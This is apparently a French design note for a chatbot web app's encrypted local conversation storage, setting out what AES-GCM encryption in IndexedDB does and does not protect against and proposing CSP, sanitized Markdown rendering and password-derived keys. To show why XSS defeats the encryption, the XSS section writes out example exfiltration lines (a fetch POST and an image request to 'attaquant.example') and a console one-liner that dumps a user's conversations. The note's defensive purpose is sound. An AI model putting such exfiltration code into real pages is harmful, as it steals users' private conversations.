# La mémoire locale chiffrée : ce qu'elle protège, et ce qu'elle ne protège pas

> Le code : `apps/web/src/storage/`. Le cours : [Jour 4 · Cours 5 — La mémoire chiffrée](../cours/jour-4-memoire-chiffree.md).

## Ce qui est stocké, et où

| Quoi | Où | Sous quelle forme |
| --- | --- | --- |
| Les conversations : utilisateur, titre, dates, messages, sources affichées | IndexedDB, base `chatbot`, magasin `conversations`, dans le profil du navigateur | `{ id, v, iv, donnees }` : seul l'`id` (UUID aléatoire) est en clair. Tout le reste est chiffré en AES-GCM 256, avec un IV de 12 octets neuf à chaque écriture, et l'`id` et la version authentifiés (AAD) |
| La clé | IndexedDB, magasin `keys` | un `CryptoKey` AES-GCM 256, **non extractible**, usages `encrypt` et `decrypt` |
| Les échanges d'outils | nulle part | affichés le temps de la réponse, puis oubliés |
| Les conversations côté serveur | nulle part | `/chat` reçoit les messages de la conversation courante le temps d'une requête, et ne garde rien |

**Ce qui reste visible sans la clé :**
- le **nombre** de conversations ;
- leur **taille** approximative (GCM ne bourre pas : la longueur du chiffré suit celle du texte) ;
- le fait que ce navigateur s'en sert.

## Contre quoi ce chiffrement protège

**1. La lecture opportuniste du disque.**
- Un `grep` dans le profil, l'indexation du système (Spotlight), une sauvegarde parcourue à la main, un outil qui extrait « l'historique des navigateurs » : tous ne trouvent que des octets.
- Les titres, les noms et les extraits de documents (qui viennent du règlement intérieur, des documents RH…) n'apparaissent nulle part en clair.

**2. Un autre utilisateur de la machine.**
- Les droits du système protègent déjà le profil de chaque compte.
- Si ces droits sont contournés (compte administrateur, disque monté ailleurs, sauvegarde partagée), il ne trouve que des données chiffrées, et non modifiables : GCM détecte toute altération.

**3. Les outils d'inspection du profil, et les DevTools.**
- Les DevTools montrent des `ArrayBuffer` et un `CryptoKey` dont aucun octet n'est affiché.
- `crypto.subtle.exportKey` refuse la clé (`InvalidAccessError`).
- La clé ne peut pas être copiée vers une autre machine par l'API web.

**La limite honnête de ces trois points : la clé est rangée dans le même profil que les données.**
- « Non extractible » est une règle **de l'API du navigateur**, pas un coffre-fort sur le disque.
- À notre connaissance, Chromium et Firefox écrivent les octets de la clé tels quels dans les fichiers de la base IndexedDB, sans les chiffrer avec le trousseau du système.
- Quelqu'un qui copie **tout** le profil et sait décoder ces fichiers peut donc retrouver la clé, puis tout déchiffrer.

Le chiffrement protège contre la lecture **directe**, la recherche et la curiosité. Il ne résiste pas à un attaquant **déterminé** qui a le profil entier. Contre lui, il faut un secret qui n'est pas sur le disque : un mot de passe (voir plus bas), et le chiffrement du disque par le système (FileVault, BitLocker), qui protège aussi tout le reste.

## Contre quoi il ne protège pas

Tout ce qui **s'exécute dans la page**, ou **avec la session ouverte**, lit les conversations en clair. Le chiffrement ne protège que les données **au repos**.

| Menace | Pourquoi le chiffrement n'y peut rien |
| --- | --- |
| **Faille XSS** (du JavaScript étranger exécuté dans notre page) | voir la section suivante : le code injecté *est* l'application |
| **Extension malveillante** ayant accès au site | elle injecte des scripts dans la page, lit le DOM (les messages affichés), peut appeler `decrypt` comme l'application. Les permissions « lire et modifier les données sur tous les sites » suffisent |
| **Session ouverte** (ordinateur déverrouillé laissé à quelqu'un) | il ouvre l'application : la liste se déchiffre seule, sans rien demander |
| **Quelqu'un qui tape dans la console** des DevTools | même chose, en une ligne : `await (await import("/src/storage/conversations.ts")).listConversations("chloe")` |
| **Logiciel malveillant** avec les droits de l'utilisateur | il lit l'écran, la mémoire du navigateur, ou le profil entier (voir la limite ci-dessus) |
| **Le serveur et le fournisseur du modèle** | ils reçoivent la conversation courante à chaque question : c'est le fonctionnement même du chat |
| **Le changement d'utilisateur fictif** | une seule clé chiffre les conversations de tous les utilisateurs du navigateur. La séparation par `userId` est un **affichage**, pas une barrière : l'identité elle-même est fictive (`X-User-Id`) |

## Pourquoi une faille XSS annule tout le chiffrement

Une faille XSS, c'est du JavaScript écrit par un attaquant qui s'exécute **dans notre page**, avec notre origine (`http://localhost:5173`). Pour le navigateur, ce code **est** l'application. Il a donc les mêmes droits qu'elle :
- **Il se sert de la clé sans la voler.** « Non extractible » interdit de lire ses octets, pas de l'utiliser. `crypto.subtle.decrypt(…, clé, …)` fonctionne pour lui comme pour nous.
- **Il n'a même pas besoin de déchiffrer.** Il appelle `listConversations` et `loadConversation`, lit l'état React, ou lit simplement le DOM : les messages y sont affichés en clair.
- **Il exfiltre** : un `fetch("https://attaquant.example", { method: "POST", body })`, une image `<img src="https://attaquant.example/?d=…">`.
- **Il peut aussi détruire ou falsifier** : `wipeAll()`, ou réécrire une conversation, puisqu'il a la clé pour produire un chiffré valide.

**Le chiffrement protège contre ceux qui lisent les données sans passer par l'application. Une XSS passe par l'application.**

Chez nous, le risque est réel : le texte affiché vient du **modèle**, qui lit des **documents**. Un document piégé peut lui faire écrire du contenu malveillant (injection de prompt). Tout ce qui est rendu doit donc être traité comme hostile.

### Ce que la CSP apporte (non implémenté, prévu)

La *Content Security Policy* est un en-tête (ou une balise `<meta>`) qui dit au navigateur quels scripts et quelles connexions la page a le droit d'utiliser :

```
Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```

- `script-src 'self'` : pas de script en ligne, pas d'`eval`, pas de script d'un autre domaine. Une injection de `<script>` ou d'un attribut `onerror=` ne s'exécute pas.
- `connect-src 'self'` et `img-src 'self'` : même si un script s'exécutait, il ne pourrait pas envoyer les conversations ailleurs que vers notre propre serveur.
- `require-trusted-types-for 'script'` (*Trusted Types*) : les fonctions dangereuses du DOM (`innerHTML`…) refusent les chaînes brutes.
- C'est une **deuxième ligne de défense** : elle limite les dégâts d'une faille, elle ne la corrige pas. Elle ne fait rien contre une extension.

### Ce que le rendu Markdown assaini apporte

C'est la **première ligne** : empêcher le texte du modèle de devenir du code.
- Aujourd'hui, `react-markdown` est utilisé **sans** `rehype-raw` (`MessageBubble.tsx`). Le HTML écrit par le modèle reste du texte échappé, et un `<img onerror=…>` s'affiche tel quel.
- `react-markdown` filtre par défaut les URL dangereuses (`javascript:`…) des liens et des images.
- À vérifier et compléter : n'ajouter `rehype-raw` qu'avec un assainisseur (`rehype-sanitize` et une liste blanche) ; garder le filtrage des URL dans le composant de lien personnalisé ; ouvrir les liens externes avec `rel="noopener noreferrer"`. Les liens vers d'autres sites restent un risque de **hameçonnage** : un lien n'exécute rien, mais peut tromper.

## Quand une clé dérivée d'un mot de passe serait meilleure

Aujourd'hui, la clé est **générée et stockée** : l'application déchiffre seule, sans rien demander. L'autre approche consiste à **dériver** la clé d'un mot de passe saisi par l'utilisateur, à chaque ouverture :

```
clé = PBKDF2(mot de passe, sel aléatoire stocké, 600 000 itérations, SHA-256)
```

PBKDF2 est dans Web Crypto. Argon2, plus résistant (il consomme aussi de la mémoire, ce qui coûte cher aux cartes graphiques d'un attaquant), demande une bibliothèque WebAssembly.

**C'est meilleur quand…**
- **l'ordinateur est partagé**, ou peut être volé ou copié : sans le mot de passe, le profil entier ne suffit plus. Le secret n'est **plus sur le disque**, il est dans la tête de l'utilisateur. C'est la vraie réponse à la limite décrite plus haut ;
- on veut un état **« verrouillé »** : après fermeture de l'onglet ou après 15 minutes d'inactivité, la clé disparaît de la mémoire, et il faut ressaisir le mot de passe ;
- les conversations sont **sensibles** (santé, RH, juridique) et l'appareil n'est pas sous contrôle.

**Ce que ça change pour l'utilisateur :**
- **Un mot de passe à saisir** à chaque session : la friction est la principale raison de ne pas le faire.
- **Mot de passe oublié, tout est perdu.** Aucun serveur ne peut aider, c'est le principe. On peut prévoir une clé de secours à imprimer.
- **La solidité dépend du mot de passe.** Le chiffré est sur le disque, et un attaquant peut tester des milliards de mots de passe hors ligne. Les itérations le ralentissent, mais un mot de passe faible tombe quand même.
- **Changer de mot de passe** sans tout rechiffrer : la clé dérivée **enveloppe** une clé de données aléatoire (`wrapKey`). Changer de mot de passe ne rechiffre que cette petite enveloppe.
- **Rien ne change contre une XSS ou une extension** une fois la session déverrouillée : la clé est en mémoire, utilisable par la page.

## En résumé

| | Clé générée et stockée (actuel) | Clé dérivée d'un mot de passe |
| --- | --- | --- |
| Lecture opportuniste du disque | protégé | protégé |
| Profil entier copié par un attaquant déterminé | **non** (la clé est dans le profil) | protégé, selon la force du mot de passe |
| Session ouverte, console, XSS, extension | non | non, une fois déverrouillé |
| Effort pour l'utilisateur | aucun | un mot de passe ; un oubli est fatal |
